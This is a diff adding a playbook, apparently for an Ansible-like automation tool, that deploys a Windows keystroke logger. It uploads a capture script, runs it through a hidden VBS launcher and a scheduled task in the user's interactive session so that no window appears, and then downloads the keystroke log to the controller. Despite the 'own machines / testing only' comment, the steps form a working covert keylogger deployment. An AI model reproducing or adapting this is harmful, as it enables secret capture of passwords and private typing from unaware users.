@@ -1,0 +1,45 @@
+# Windows demo: capture pressed keys as ASCII text for a limited time,
+# then download the log. For OWN machines / testing only: runs in YOUR
+# interactive session via a scheduled task (/IT) - WinRM shells (session 0)
+# see no input. Run from the repo root (script paths below are relative).
+# TIME LIMIT: set capture_seconds below, e.g. "120" = 2 min test,
+# "300" = 5 min, "600" = 10 min. Wait task covers limit + margin.
+# The capture runs fully hidden (VBS launcher, no console flash).
+- name: Windows key capture demo
+  hosts: win
+  vars:
+    capture_seconds: "120"
+  tasks:
+    - name: Upload capture script
+      copy: {src: examples/windows/Take-Keys.ps1, dest: C:/Temp/takekeys.ps1}
+
+    - name: Render hidden launcher
+      template: {src: examples/windows/Take-Keys-Launcher.vbs.tmpl, dest: C:/Temp/klauncher.vbs, capture_seconds: "{{.capture_seconds}}"}
+
+    - name: Kill stale captures
+      command: "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*takekeys*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }; exit 0"
+
+    - name: Clean previous capture
+      command: "Remove-Item C:/Temp/keys.log, C:/Temp/keys.done -Force -ErrorAction SilentlyContinue; schtasks /delete /tn goaf-keys /f 2>$null; exit 0"
+
+    - name: Assert clean slate
+      command: "(Test-Path C:/Temp/keys.done)"
+      failed_when: '{{eq .result "True"}}'
+
+    - name: Create interactive task
+      command: 'schtasks /create /tn goaf-keys /tr "wscript.exe //B //Nologo C:/Temp/klauncher.vbs" /sc once /st 23:59 /f /IT'
+
+    - name: Start capture
+      command: "schtasks /run /tn goaf-keys"
+
+    - name: Wait for capture to finish
+      command: "(Test-Path C:/Temp/keys.done)"
+      retries: 20
+      delay: 10
+      until: '{{eq .result "True"}}'
+
+    - name: Download key log
+      fetch: {src: C:/Temp/keys.log, dest: ./captured/}
+
+    - name: Cleanup task
+      command: "schtasks /delete /tn goaf-keys /f"
